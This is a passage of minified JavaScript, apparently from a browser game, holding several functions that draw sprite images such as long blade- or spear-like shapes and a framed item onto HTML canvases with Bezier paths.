      n.bezierCurveTo(e * 60, e * 589.5, e * 60, e * 589.5, e * 60, e * 598);
      n.bezierCurveTo(e * 60, e * 604, e * 59, e * 609, e * 48, e * 608);
      n.bezierCurveTo(e * 40, e * 607, e * 40, e * 606, e * 41, e * 581);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 106);
      n.bezierCurveTo(e * 31, e * 124.5, e * 31, e * 124.5, e * 31, e * 143);
      n.bezierCurveTo(e * 31, e * 163, e * 38, e * 169, e * 48, e * 168);
      n.bezierCurveTo(e * 57, e * 168, e * 67, e * 165, e * 67, e * 148);
      n.bezierCurveTo(e * 67, e * 123.5, e * 67, e * 123.5, e * 67, e * 99);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 49, e * 27);
      n.bezierCurveTo(e * 64, e * 62.5, e * 64, e * 62.5, e * 79, e * 98);
      n.bezierCurveTo(e * 74, e * 113, e * 63, e * 121, e * 50, e * 122);
      n.bezierCurveTo(e * 35, e * 123, e * 22, e * 109, e * 20, e * 98);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 49, e * 43);
      n.bezierCurveTo(e * 61, e * 70, e * 61, e * 70, e * 73, e * 97);
      n.bezierCurveTo(e * 66, e * 116, e * 43, e * 122, e * 26, e * 99);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 50.5, e * 349.5);
      Be(n, e * -13.5, e * -249.5, e * 27, e * 499, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 538);
      n.bezierCurveTo(e * 49.5, e * 538, e * 49.5, e * 538, e * 63, e * 538);
      n.bezierCurveTo(e * 63.5, e * 568, e * 63.5, e * 568, e * 64, e * 598);
      n.bezierCurveTo(e * 50, e * 598, e * 50, e * 598, e * 36, e * 598);
      n.bezierCurveTo(e * 36, e * 568.5, e * 36, e * 568.5, e * 36, e * 539);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 36, e * 554);
      n.bezierCurveTo(e * 45, e * 561, e * 56, e * 558, e * 63, e * 554);
      n.closePath();
      ye(n, undefined, t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 569);
      n.bezierCurveTo(e * 44, e * 576, e * 58, e * 574, e * 68, e * 569);
      n.bezierCurveTo(e * 68, e * 584, e * 68, e * 584, e * 68, e * 599);
      n.bezierCurveTo(e * 68, e * 608, e * 65, e * 618, e * 49, e * 617);
      n.bezierCurveTo(e * 34, e * 617, e * 32, e * 610, e * 32, e * 598);
      n.closePath();
      ye(n, t[5], t[6], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 41, e * 581);
      n.bezierCurveTo(e * 48, e * 584, e * 55, e * 583, e * 60, e * 581);
      n.bezierCurveTo(e * 60, e * 589.5, e * 60, e * 589.5, e * 60, e * 598);
      n.bezierCurveTo(e * 60, e * 604, e * 59, e * 609, e * 48, e * 608);
      n.bezierCurveTo(e * 40, e * 607, e * 40, e * 606, e * 41, e * 581);
      n.closePath();
      ye(n, t[7]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 106);
      n.bezierCurveTo(e * 31, e * 124.5, e * 31, e * 124.5, e * 31, e * 143);
      n.bezierCurveTo(e * 31, e * 163, e * 38, e * 169, e * 48, e * 168);
      n.bezierCurveTo(e * 57, e * 168, e * 67, e * 165, e * 67, e * 148);
      n.bezierCurveTo(e * 67, e * 123.5, e * 67, e * 123.5, e * 67, e * 99);
      n.closePath();
      ye(n, t[5], t[6], e * 8);
      n.save();
      n.translate(e * -46, e * -50);
      n.scale(2, 2);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 51, e * 80);
      n.bezierCurveTo(e * 51, e * 89.5, e * 51, e * 89.5, e * 51, e * 99);
      n.bezierCurveTo(e * 49, e * 103, e * 46, e * 105, e * 44, e * 99);
      n.bezierCurveTo(e * 44, e * 88.5, e * 44, e * 88.5, e * 44, e * 78);
      n.closePath();
      ye(n, t[8]);
      n.restore();
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 49, e * 27);
      n.bezierCurveTo(e * 64, e * 62.5, e * 64, e * 62.5, e * 79, e * 98);
      n.bezierCurveTo(e * 74, e * 113, e * 63, e * 121, e * 50, e * 122);
      n.bezierCurveTo(e * 35, e * 123, e * 22, e * 109, e * 20, e * 98);
      n.closePath();
      ye(n, t[8], t[9], e * 8);
      n.scale(2, 2);
      n.translate(e * -23, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 57, e * 69);
      n.bezierCurveTo(e * 50, e * 76, e * 43, e * 75, e * 38, e * 69);
      n.bezierCurveTo(e * 43, e * 57, e * 43, e * 57, e * 48, e * 45);
      n.closePath();
      ye(n, t[10]);
      return r;
    }
    function ft(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 88;
      r.height = e * 647;
      n.translate(e * 20, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 45, e * 384.5);
      Be(n, e * -15, e * -216.5, e * 30, e * 433, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 572);
      n.bezierCurveTo(e * 44, e * 580, e * 55, e * 576, e * 62, e * 572);
      n.bezierCurveTo(e * 65, e * 585.5, e * 65, e * 585.5, e * 68, e * 599);
      n.bezierCurveTo(e * 71, e * 612, e * 68, e * 618, e * 34, e * 616);
      n.bezierCurveTo(e * 14, e * 615, e * 19, e * 607, e * 27, e * 573);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 587);
      n.bezierCurveTo(e * 39, e * 590, e * 48, e * 588, e * 54, e * 587);
      n.bezierCurveTo(e * 57, e * 604, e * 59, e * 609, e * 46, e * 609);
      n.bezierCurveTo(e * 27, e * 609, e * 28, e * 605, e * 33, e * 588);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 113);
      n.bezierCurveTo(e * 27, e * 139, e * 27, e * 139, e * 23, e * 165);
      n.bezierCurveTo(e * 18, e * 187, e * 39, e * 195, e * 57, e * 186);
      n.bezierCurveTo(e * 68, e * 180, e * 65, e * 171, e * 62, e * 153);
      n.bezierCurveTo(e * 58.5, e * 131, e * 58.5, e * 131, e * 55, e * 109);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 139);
      n.bezierCurveTo(e * 43, e * 139, e * 43, e * 139, e * 47, e * 139);
      n.bezierCurveTo(e * 51, e * 158, e * 56, e * 176, e * 44, e * 175);
      n.bezierCurveTo(e * 33, e * 177, e * 34, e * 167, e * 39, e * 140);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 29);
      n.bezierCurveTo(e * 57, e * 63, e * 57, e * 63, e * 70, e * 97);
      n.bezierCurveTo(e * 60, e * 111, e * 60, e * 111, e * 50, e * 125);
      n.bezierCurveTo(e * 45, e * 128, e * 41, e * 128, e * 35, e * 124);
      n.bezierCurveTo(e * 26.5, e * 110, e * 26.5, e * 110, e * 18, e * 96);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 54);
      n.bezierCurveTo(e * 50, e * 72, e * 50, e * 72, e * 56, e * 90);
      n.bezierCurveTo(e * 58, e * 94, e * 59, e * 98, e * 53, e * 105);
      n.bezierCurveTo(e * 47, e * 113, e * 43, e * 113, e * 36, e * 103);
      n.bezierCurveTo(e * 29, e * 96, e * 31, e * 94, e * 35, e * 83);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 45, e * 384.5);
      Be(n, e * -15, e * -216.5, e * 30, e * 433, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 27, e * 572);
      n.bezierCurveTo(e * 44, e * 580, e * 55, e * 576, e * 62, e * 572);
      n.bezierCurveTo(e * 65, e * 585.5, e * 65, e * 585.5, e * 68, e * 599);
      n.bezierCurveTo(e * 71, e * 612, e * 68, e * 618, e * 34, e * 616);
      n.bezierCurveTo(e * 14, e * 615, e * 19, e * 607, e * 27, e * 573);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 32, e * 587);
      n.bezierCurveTo(e * 39, e * 590, e * 48, e * 588, e * 54, e * 587);
      n.bezierCurveTo(e * 57, e * 604, e * 59, e * 609, e * 46, e * 609);
      n.bezierCurveTo(e * 27, e * 609, e * 28, e * 605, e * 33, e * 588);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 31, e * 113);
      n.bezierCurveTo(e * 27, e * 139, e * 27, e * 139, e * 23, e * 165);
      n.bezierCurveTo(e * 18, e * 187, e * 39, e * 195, e * 57, e * 186);
      n.bezierCurveTo(e * 68, e * 180, e * 65, e * 171, e * 62, e * 153);
      n.bezierCurveTo(e * 58.5, e * 131, e * 58.5, e * 131, e * 55, e * 109);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 39, e * 139);
      n.bezierCurveTo(e * 43, e * 139, e * 43, e * 139, e * 47, e * 139);
      n.bezierCurveTo(e * 51, e * 158, e * 56, e * 176, e * 44, e * 175);
      n.bezierCurveTo(e * 33, e * 177, e * 34, e * 167, e * 39, e * 140);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 29);
      n.bezierCurveTo(e * 57, e * 63, e * 57, e * 63, e * 70, e * 97);
      n.bezierCurveTo(e * 60, e * 111, e * 60, e * 111, e * 50, e * 125);
      n.bezierCurveTo(e * 45, e * 128, e * 41, e * 128, e * 35, e * 124);
      n.bezierCurveTo(e * 26.5, e * 110, e * 26.5, e * 110, e * 18, e * 96);
      n.closePath();
      ye(n, t[6], t[7], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 54);
      n.bezierCurveTo(e * 50, e * 72, e * 50, e * 72, e * 56, e * 90);
      n.bezierCurveTo(e * 58, e * 94, e * 59, e * 98, e * 53, e * 105);
      n.bezierCurveTo(e * 47, e * 113, e * 43, e * 113, e * 36, e * 103);
      n.bezierCurveTo(e * 29, e * 96, e * 31, e * 94, e * 35, e * 83);
      n.closePath();
      ye(n, t[8]);
      return r;
    }
    function Ht(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 106;
      r.height = e * 681;
      n.translate(e * 20, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 52.5, e * 395);
      n.rotate(0);
      Be(n, e * -11.5, e * -226, e * 23, e * 452, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 588);
      n.bezierCurveTo(e * 47, e * 596, e * 61, e * 594, e * 69, e * 588);
      n.bezierCurveTo(e * 79, e * 615, e * 78, e * 632, e * 59, e * 643);
      n.bezierCurveTo(e * 41, e * 650, e * 27, e * 632, e * 30, e * 610);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 135);
      n.bezierCurveTo(e * 61.5, e * 142, e * 61.5, e * 142, e * 71, e * 149);
      n.bezierCurveTo(e * 69.5, e * 166, e * 69.5, e * 166, e * 68, e * 183);
      n.bezierCurveTo(e * 60.5, e * 187.5, e * 60.5, e * 187.5, e * 53, e * 192);
      n.bezierCurveTo(e * 45, e * 187.5, e * 45, e * 187.5, e * 37, e * 183);
      n.bezierCurveTo(e * 35.5, e * 167, e * 35.5, e * 167, e * 34, e * 151);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 64, e * 150);
      n.bezierCurveTo(e * 63, e * 164, e * 63, e * 164, e * 62, e * 178);
      n.bezierCurveTo(e * 58, e * 181, e * 58, e * 181, e * 54, e * 184);
      n.bezierCurveTo(e * 48.5, e * 181.5, e * 48.5, e * 181.5, e * 43, e * 179);
      n.bezierCurveTo(e * 42, e * 164.5, e * 42, e * 164.5, e * 41, e * 150);
      n.bezierCurveTo(e * 46, e * 152.5, e * 46, e * 152.5, e * 51, e * 155);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 39);
      n.bezierCurveTo(e * 65.5, e * 82, e * 65.5, e * 82, e * 79, e * 125);
      n.bezierCurveTo(e * 66, e * 137.5, e * 66, e * 137.5, e * 53, e * 150);
      n.bezierCurveTo(e * 39, e * 138, e * 39, e * 138, e * 25, e * 126);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 64);
      n.bezierCurveTo(e * 60, e * 92.5, e * 60, e * 92.5, e * 68, e * 121);
      n.bezierCurveTo(e * 61, e * 127.5, e * 61, e * 127.5, e * 54, e * 134);
      n.bezierCurveTo(e * 46.5, e * 127.5, e * 46.5, e * 127.5, e * 39, e * 121);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 52.5, e * 395);
      n.rotate(0);
      Be(n, e * -11.5, e * -226, e * 23, e * 452, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 588);
      n.bezierCurveTo(e * 47, e * 596, e * 61, e * 594, e * 69, e * 588);
      n.bezierCurveTo(e * 79, e * 615, e * 78, e * 632, e * 59, e * 643);
      n.bezierCurveTo(e * 41, e * 650, e * 27, e * 632, e * 30, e * 610);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 135);
      n.bezierCurveTo(e * 61.5, e * 142, e * 61.5, e * 142, e * 71, e * 149);
      n.bezierCurveTo(e * 69.5, e * 166, e * 69.5, e * 166, e * 68, e * 183);
      n.bezierCurveTo(e * 60.5, e * 187.5, e * 60.5, e * 187.5, e * 53, e * 192);
      n.bezierCurveTo(e * 45, e * 187.5, e * 45, e * 187.5, e * 37, e * 183);
      n.bezierCurveTo(e * 35.5, e * 167, e * 35.5, e * 167, e * 34, e * 151);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 64, e * 150);
      n.bezierCurveTo(e * 63, e * 164, e * 63, e * 164, e * 62, e * 178);
      n.bezierCurveTo(e * 58, e * 181, e * 58, e * 181, e * 54, e * 184);
      n.bezierCurveTo(e * 48.5, e * 181.5, e * 48.5, e * 181.5, e * 43, e * 179);
      n.bezierCurveTo(e * 42, e * 164.5, e * 42, e * 164.5, e * 41, e * 150);
      n.bezierCurveTo(e * 46, e * 152.5, e * 46, e * 152.5, e * 51, e * 155);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 39);
      n.bezierCurveTo(e * 65.5, e * 82, e * 65.5, e * 82, e * 79, e * 125);
      n.bezierCurveTo(e * 66, e * 137.5, e * 66, e * 137.5, e * 53, e * 150);
      n.bezierCurveTo(e * 39, e * 138, e * 39, e * 138, e * 25, e * 126);
      n.closePath();
      ye(n, t[6], t[7], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 64);
      n.bezierCurveTo(e * 60, e * 92.5, e * 60, e * 92.5, e * 68, e * 121);
      n.bezierCurveTo(e * 61, e * 127.5, e * 61, e * 127.5, e * 54, e * 134);
      n.bezierCurveTo(e * 46.5, e * 127.5, e * 46.5, e * 127.5, e * 39, e * 121);
      n.closePath();
      ye(n, t[8]);
      return r;
    }
    function Pt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 108;
      r.height = e * 669;
      n.translate(e * 20, e * 20);
      n.globalAlpha = i ? 0.5 : 1;
      n.save();
      n.translate(e * 54, e * 389.5);
      Be(n, e * -15, e * -228.5, e * 30, e * 457, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 579);
      n.bezierCurveTo(e * 47, e * 587, e * 61, e * 584, e * 71, e * 579);
      n.bezierCurveTo(e * 75, e * 597.5, e * 75, e * 597.5, e * 79, e * 616);
      n.bezierCurveTo(e * 66.5, e * 628, e * 66.5, e * 628, e * 54, e * 640);
      n.bezierCurveTo(e * 41, e * 628.5, e * 41, e * 628.5, e * 28, e * 617);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 141);
      n.bezierCurveTo(e * 40, e * 136, e * 40, e * 136, e * 50, e * 131);
      n.bezierCurveTo(e * 63, e * 136, e * 63, e * 136, e * 76, e * 141);
      n.bezierCurveTo(e * 72.5, e * 161.5, e * 72.5, e * 161.5, e * 69, e * 182);
      n.bezierCurveTo(e * 61.5, e * 186.5, e * 61.5, e * 186.5, e * 54, e * 191);
      n.bezierCurveTo(e * 45, e * 186.5, e * 45, e * 186.5, e * 36, e * 182);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42, e * 152);
      n.bezierCurveTo(e * 53, e * 152, e * 53, e * 152, e * 64, e * 152);
      n.bezierCurveTo(e * 62, e * 171, e * 62, e * 176, e * 55, e * 177);
      n.bezierCurveTo(e * 42, e * 176, e * 45, e * 174, e * 42, e * 152);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 28);
      n.bezierCurveTo(e * 67.5, e * 55, e * 67.5, e * 55, e * 83, e * 82);
      n.bezierCurveTo(e * 80, e * 106.5, e * 80, e * 106.5, e * 77, e * 131);
      n.bezierCurveTo(e * 58, e * 147, e * 44, e * 141, e * 29, e * 131);
      n.bezierCurveTo(e * 26.5, e * 106.5, e * 26.5, e * 106.5, e * 24, e * 82);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 53, e * 53);
      n.bezierCurveTo(e * 61, e * 70, e * 61, e * 70, e * 69, e * 87);
      n.bezierCurveTo(e * 67, e * 106, e * 67, e * 106, e * 65, e * 125);
      n.bezierCurveTo(e * 54, e * 130, e * 51, e * 130, e * 41, e * 125);
      n.bezierCurveTo(e * 39, e * 105, e * 39, e * 105, e * 37, e * 85);
      n.closePath();
      ye(n, t[0]);
      n.translate(e * -20, e * -20);
      n.globalAlpha = 1;
      n.save();
      n.translate(e * 54, e * 389.5);
      n.rotate(0);
      Be(n, e * -15, e * -228.5, e * 30, e * 457, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 579);
      n.bezierCurveTo(e * 47, e * 587, e * 61, e * 584, e * 71, e * 579);
      n.bezierCurveTo(e * 75, e * 597.5, e * 75, e * 597.5, e * 79, e * 616);
      n.bezierCurveTo(e * 66.5, e * 628, e * 66.5, e * 628, e * 54, e * 640);
      n.bezierCurveTo(e * 41, e * 628.5, e * 41, e * 628.5, e * 28, e * 617);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 30, e * 141);
      n.bezierCurveTo(e * 40, e * 136, e * 40, e * 136, e * 50, e * 131);
      n.bezierCurveTo(e * 63, e * 136, e * 63, e * 136, e * 76, e * 141);
      n.bezierCurveTo(e * 72.5, e * 161.5, e * 72.5, e * 161.5, e * 69, e * 182);
      n.bezierCurveTo(e * 61.5, e * 186.5, e * 61.5, e * 186.5, e * 54, e * 191);
      n.bezierCurveTo(e * 45, e * 186.5, e * 45, e * 186.5, e * 36, e * 182);
      n.closePath();
      ye(n, t[3], t[4], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 42, e * 152);
      n.bezierCurveTo(e * 53, e * 152, e * 53, e * 152, e * 64, e * 152);
      n.bezierCurveTo(e * 62, e * 171, e * 62, e * 176, e * 55, e * 177);
      n.bezierCurveTo(e * 42, e * 176, e * 45, e * 174, e * 42, e * 152);
      n.closePath();
      ye(n, t[5]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 52, e * 28);
      n.bezierCurveTo(e * 67.5, e * 55, e * 67.5, e * 55, e * 83, e * 82);
      n.bezierCurveTo(e * 80, e * 106.5, e * 80, e * 106.5, e * 77, e * 131);
      n.bezierCurveTo(e * 58, e * 147, e * 44, e * 141, e * 29, e * 131);
      n.bezierCurveTo(e * 26.5, e * 106.5, e * 26.5, e * 106.5, e * 24, e * 82);
      n.closePath();
      ye(n, t[6], t[7], e * 8);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 53, e * 53);
      n.bezierCurveTo(e * 61, e * 70, e * 61, e * 70, e * 69, e * 87);
      n.bezierCurveTo(e * 67, e * 106, e * 67, e * 106, e * 65, e * 125);
      n.bezierCurveTo(e * 54, e * 130, e * 51, e * 130, e * 41, e * 125);
      n.bezierCurveTo(e * 39, e * 105, e * 39, e * 105, e * 37, e * 85);
      n.closePath();
      ye(n, t[8]);
      return r;
    }
    function yt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 43;
      r.height = e * 209;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(0, e * 10);
      n.translate(e * 5, e * 5);
      n.save();
      n.translate(e * 21, e * 102.5);
      Be(n, e * -4, e * -76.5, e * 8, e * 163, e * 10);
      n.restore();
      ye(n, t[0]);
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 20, e * 10);
      n.bezierCurveTo(e * 25, e * 25.5, e * 25, e * 25.5, e * 30, e * 41);
      n.bezierCurveTo(e * 25.5, e * 38.5, e * 25.5, e * 38.5, e * 21, e * 36);
      n.bezierCurveTo(e * 16, e * 38.5, e * 16, e * 38.5, e * 11, e * 41);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 21, e * 1);
      n.bezierCurveTo(e * 28, e * 18, e * 28, e * 18, e * 35, e * 35);
      n.bezierCurveTo(e * 28.5, e * 32, e * 28.5, e * 32, e * 22, e * 29);
      n.bezierCurveTo(e * 14.5, e * 32.5, e * 14.5, e * 32.5, e * 7, e * 36);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 14, e * 146);
      n.bezierCurveTo(e * 21, e * 146, e * 21, e * 146, e * 28, e * 146);
      n.bezierCurveTo(e * 27.5, e * 147.5, e * 27.5, e * 147.5, e * 27, e * 149);
      n.bezierCurveTo(e * 27, e * 160, e * 27, e * 160, e * 27, e * 171);
      n.bezierCurveTo(e * 27.5, e * 171.5, e * 27.5, e * 171.5, e * 28, e * 172);
      n.bezierCurveTo(e * 21, e * 172, e * 21, e * 172, e * 14, e * 172);
      n.bezierCurveTo(e * 14, e * 171.5, e * 14, e * 171.5, e * 14, e * 171);
      n.bezierCurveTo(e * 14.5, e * 171.5, e * 14.5, e * 171.5, e * 15, e * 172);
      n.bezierCurveTo(e * 15, e * 160.5, e * 15, e * 160.5, e * 15, e * 149);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 21, e * 6);
      n.bezierCurveTo(e * 26.5, e * 18.5, e * 26.5, e * 18.5, e * 32, e * 31);
      n.bezierCurveTo(e * 27, e * 29, e * 27, e * 29, e * 22, e * 27);
      n.closePath();
      ye(n, t[0]);
      n.translate(0, e * -20);
      n.globalAlpha = 1;
      n.translate(0, e * 10);
      n.translate(e * -5, e * -5);
      n.save();
      n.translate(e * 21, e * 102.5);
      Be(n, e * -4, e * -76.5, e * 8, e * 163, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 4);
      n.translate(0, e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 20, e * 10);
      n.bezierCurveTo(e * 25, e * 25.5, e * 25, e * 25.5, e * 30, e * 41);
      n.bezierCurveTo(e * 25.5, e * 38.5, e * 25.5, e * 38.5, e * 21, e * 36);
      n.bezierCurveTo(e * 16, e * 38.5, e * 16, e * 38.5, e * 11, e * 41);
      n.closePath();
      ye(n, t[3], t[4], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 21, e * 1);
      n.bezierCurveTo(e * 28, e * 18, e * 28, e * 18, e * 35, e * 35);
      n.bezierCurveTo(e * 28.5, e * 32, e * 28.5, e * 32, e * 22, e * 29);
      n.bezierCurveTo(e * 14.5, e * 32.5, e * 14.5, e * 32.5, e * 7, e * 36);
      n.closePath();
      ye(n, t[5], t[6], e * 4);
      n.translate(0, e * 0);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 14, e * 146);
      n.bezierCurveTo(e * 21, e * 146, e * 21, e * 146, e * 28, e * 146);
      n.bezierCurveTo(e * 27.5, e * 147.5, e * 27.5, e * 147.5, e * 27, e * 149);
      n.bezierCurveTo(e * 27, e * 160, e * 27, e * 160, e * 27, e * 171);
      n.bezierCurveTo(e * 27.5, e * 171.5, e * 27.5, e * 171.5, e * 28, e * 172);
      n.bezierCurveTo(e * 21, e * 172, e * 21, e * 172, e * 14, e * 172);
      n.bezierCurveTo(e * 14, e * 171.5, e * 14, e * 171.5, e * 14, e * 171);
      n.bezierCurveTo(e * 14.5, e * 171.5, e * 14.5, e * 171.5, e * 15, e * 172);
      n.bezierCurveTo(e * 15, e * 160.5, e * 15, e * 160.5, e * 15, e * 149);
      n.closePath();
      ye(n, t[1], t[2], e * 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 21, e * 6);
      n.bezierCurveTo(e * 26.5, e * 18.5, e * 26.5, e * 18.5, e * 32, e * 31);
      n.bezierCurveTo(e * 27, e * 29, e * 27, e * 29, e * 22, e * 27);
      n.closePath();
      ye(n, t[8]);
      return r;
    }
    function Bt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 200;
      r.height = e * 200;
      n.save();
      n.translate(e * 112, e * 158);
      Be(n, e * -86.5, e * -86, e * 150, e * 35, e * 20);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 170, e * 100);
      Be(n, e * -86.5, e * -86, e * 35, e * 150, e * 20);
      n.restore();
      ye(n, t[0]);
      return r;
    }
    function zt(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 165;
      r.height = e * 123;
      n.save();
      n.translate(e * 81, e * 65);
      Be(n, e * -78, e * -54.5, e * 156, e * 109, e * 20);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 81, e * 58);
      Be(n, e * -78, e * -54.5, e * 156, e * 109, e * 20);
      n.restore();
      ye(n, t[1], t[2], 4);
      n.save();
      n.translate(e * 81, e * 58);
      Be(n, e * -69, e * -47, e * 138, e * 93, e * 15);
      n.restore();
      ye(n, t[3], t[4], 4);
      n.save();
      n.translate(e * 79, e * 54);
      Be(n, e * -34, e * -40, e * 68, e * 88, e * 13);
      n.restore();
      ye(n, undefined, t[5], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 44, e * 13);
      n.bezierCurveTo(e * 43.5, e * 55, e * 43.5, e * 55, e * 43, e * 101);
      n.closePath();
      ye(n, undefined, t[6], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 115, e * 13);
      n.bezierCurveTo(e * 115, e * 56, e * 115, e * 56, e * 115, e * 101);
      n.closePath();
      ye(n, undefined, t[6], 4);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 35, e * 6);
